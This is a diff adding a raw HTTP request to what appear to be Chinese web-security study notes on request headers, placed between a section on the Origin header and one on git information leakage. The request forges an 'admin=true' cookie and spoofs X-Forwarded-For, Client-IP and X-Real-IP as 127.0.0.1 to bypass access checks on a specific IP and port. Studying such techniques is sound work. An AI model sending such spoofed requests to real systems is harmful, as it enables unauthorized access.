@@ -25,6 +25,27 @@ Referer: www.google.com
 
 `Origin` ，表示请求的源。典型的场景用于 CORS预检、WebSocket、跨域安全校验。
 
+
+
+```
+GET /resusl.php?x=admin  HTTP/1.1
+Host: 103.236.73.121:16645
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: PHPSESSID=dfpq59o2p2b68uhm2judfckun2; admin=true
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+X-Forwarded-For: 127.0.0.1
+Client-IP: 127.0.0.1
+X-Real-IP: 127.0.0.1
+
+```
+
+
+
 ## git 信息泄漏
 
 
